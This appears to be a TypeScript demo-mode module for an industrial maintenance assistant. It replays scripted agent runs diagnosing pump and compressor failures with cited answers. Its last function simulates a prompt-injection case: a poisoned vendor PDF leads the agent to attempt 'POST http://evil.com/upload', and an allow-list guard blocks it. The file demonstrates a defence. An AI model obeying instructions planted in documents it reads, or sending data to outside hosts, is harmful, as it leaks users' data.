// Scripted agent runs for demo mode. They emit the same AgentEvent stream
// the backend will send over SSE, so the UI code doesn't change.

import { addBlocked, logAudit } from './store'
import type { AgentEvent, Citation } from './types'

interface ScriptStep {
  tool: string
  input: string
  summary: string
  ms: number
}

interface Script {
  steps: ScriptStep[]
  answer: string
  citations: Citation[]
  canDraft: boolean
}

const P101_CITATIONS: Citation[] = [
  {
    id: 1,
    kind: 'inspection',
    label: 'Inspection · p. 2',
    title: 'Inspection report IR-2026-118 · page 2',
    quote: 'Misalignment observed: 0.3 mm',
  },
  {
    id: 2,
    kind: 'manual',
    label: 'Manual · p. 18',
    title: 'Centrifugal pump manual · page 18',
    quote:
      'Shaft misalignment beyond 0.05 mm loads the seal faces unevenly and is a leading cause of premature mechanical seal wear.',
  },
  {
    id: 3,
    kind: 'work_orders',
    label: 'Work orders',
    title: 'P-101 work orders · last 180 days',
    quote: '4 × mechanical seal leakage: 02 Jun, 18 Jul, 01 Sep, 15 Oct 2026',
  },
]

const SCRIPTS: { match: RegExp; script: Script }[] = [
  {
    match: /p-?101|feed pump|keep failing/i,
    script: {
      steps: [
        { tool: 'get_asset_history', input: 'tag=P-101', summary: '7 work orders', ms: 400 },
        { tool: 'read_inspection', input: 'tag=P-101', summary: 'Misalignment found', ms: 1200 },
        { tool: 'search_manuals', input: 'seal failure misalignment', summary: '2 relevant passages', ms: 800 },
        { tool: 'predict_risk', input: 'tag=P-101', summary: 'Score 82/100', ms: 300 },
      ],
      answer:
        '## Likely root cause: shaft misalignment\n' +
        'P-101 has had four mechanical seal failures in the last 180 days, and its MTBF fell from 112 to 45 days [3]. ' +
        'The latest inspection on 12 Nov 2026 found 0.3 mm shaft misalignment and moderate seal wear [1]. ' +
        'The pump manual says misalignment beyond 0.05 mm loads the seal faces unevenly and wears seals early [2]. ' +
        'Each repair replaced the seal but left the misalignment, so the failure keeps coming back.\n' +
        '## Recommended next step\n' +
        'Laser-align the pump and motor shafts to within 0.05 mm before the next seal replacement, then check the seal flush plan. ' +
        'Confirm the finding with a reliability engineer.',
      citations: P101_CITATIONS,
      canDraft: true,
    },
  },
  {
    match: /risk next|at risk|next/i,
    script: {
      steps: [
        { tool: 'get_bad_actors', input: 'top_n=5', summary: '5 assets', ms: 350 },
        { tool: 'predict_risk', input: 'tag=P-101', summary: 'Score 82/100', ms: 300 },
        { tool: 'predict_risk', input: 'tag=C-201', summary: 'Score 74/100', ms: 300 },
        { tool: 'predict_risk', input: 'tag=P-104', summary: 'Score 61/100', ms: 300 },
      ],
      answer:
        '## Assets most at risk next\n' +
        '1. P-101 Feed pump: risk 82/100, driven by high torque and tool wear above 200 min. Four seal failures in 180 days [1].\n' +
        '2. C-201 Recycle gas compressor: risk 74/100. Three valve failures and MTBF down 43% [1].\n' +
        '3. P-104 Reflux pump: risk 61/100. Bearing temperature trending up.\n' +
        '## Recommended next step\n' +
        'Prioritise the P-101 alignment check this week and plan C-201 valve inspection at the next shutdown.',
      citations: [
        { id: 1, kind: 'work_orders', label: 'Bad-actor ranking', title: 'Bad-actor ranking · last 180 days', quote: 'P-101 score 92 · C-201 score 81 · P-104 score 68' },
      ],
      canDraft: false,
    },
  },
  {
    match: /c-?201|compressor/i,
    script: {
      steps: [
        { tool: 'get_asset_history', input: 'tag=C-201', summary: '9 work orders', ms: 400 },
        { tool: 'search_manuals', input: 'compressor valve failure', summary: '3 passages', ms: 700 },
      ],
      answer:
        '## C-201 Recycle gas compressor\n' +
        'Three suction valve failures in 180 days, MTBF down 43% to 58 days, ₹9.2 L in repair cost [1]. ' +
        'The compressor manual links repeated valve plate failures to liquid carry-over from the suction drum [2].\n' +
        '## Recommended next step\n' +
        'Check the knock-out drum level transmitter and trend discharge temperature before the next valve change.',
      citations: [
        { id: 1, kind: 'work_orders', label: 'Work orders', title: 'C-201 work orders · last 180 days', quote: '3 × valve failure, ₹9.2 L total' },
        { id: 2, kind: 'manual', label: 'Manual · p. 41', title: 'Reciprocating compressor manual · page 41', quote: 'Liquid carry-over is the most common cause of repeated valve plate breakage.' },
      ],
      canDraft: false,
    },
  },
]

const FALLBACK: Script = {
  steps: [{ tool: 'get_bad_actors', input: 'top_n=10', summary: '10 assets', ms: 350 }],
  answer:
    '## Demo mode\n' +
    'This screen is running on demo data, so only a few questions have scripted answers. ' +
    'Try "Why does P-101 keep failing?", "Which assets are at risk next?" or "Summarise C-201".',
  citations: [],
  canDraft: false,
}

/** Runs a scripted answer. Returns a cancel function. */
export function runMockAgent(question: string, onEvent: (e: AgentEvent) => void): () => void {
  const script = SCRIPTS.find((s) => s.match.test(question))?.script ?? FALLBACK
  let cancelled = false
  const timers: number[] = []
  const later = (ms: number, fn: () => void) =>
    new Promise<void>((resolve) => {
      timers.push(window.setTimeout(() => (cancelled ? resolve() : (fn(), resolve())), ms))
    })

  void (async () => {
    for (const [i, s] of script.steps.entries()) {
      if (cancelled) return
      const stepId = `s${i}`
      onEvent({ type: 'step', step: { id: stepId, tool: s.tool, summary: 'Running…', status: 'running' } })
      await later(s.ms, () => {
        onEvent({ type: 'step', step: { id: stepId, tool: s.tool, summary: s.summary, status: 'done', duration_ms: s.ms } })
        logAudit(s.tool, s.input, s.summary)
      })
    }
    // Stream the answer in small chunks
    const words = script.answer.split(/(\s+)/)
    for (let i = 0; i < words.length; i += 3) {
      if (cancelled) return
      await later(28, () => onEvent({ type: 'token', text: words.slice(i, i + 3).join('') }))
    }
    if (!cancelled) onEvent({ type: 'done', citations: script.citations, can_draft_work_order: script.canDraft })
  })()

  return () => {
    cancelled = true
    timers.forEach(clearTimeout)
  }
}

/** The poisoned vendor PDF scenario: agent reads it, tries to send data out, guard blocks it. */
export function runMockInjection(onEvent: (e: AgentEvent) => void): () => void {
  const timers: number[] = []
  onEvent({ type: 'step', step: { id: 'i0', tool: 'search_manuals', summary: 'Running…', status: 'running' } })
  timers.push(
    window.setTimeout(() => {
      onEvent({ type: 'step', step: { id: 'i0', tool: 'search_manuals', summary: 'Read vendor_seal_datasheet.pdf', status: 'done', duration_ms: 600 } })
      logAudit('search_manuals', 'seal datasheet', 'vendor_seal_datasheet.pdf p. 3')
      onEvent({ type: 'step', step: { id: 'i1', tool: 'external_request', summary: 'POST http://evil.com/upload', status: 'running' } })
    }, 600),
    window.setTimeout(() => {
      const attempt = addBlocked()
      onEvent({ type: 'step', step: { id: 'i1', tool: 'external_request', summary: 'Blocked: not on allow-list', status: 'blocked', duration_ms: 2 } })
      onEvent({ type: 'blocked', attempt })
    }, 1100),
  )
  return () => timers.forEach(clearTimeout)
}
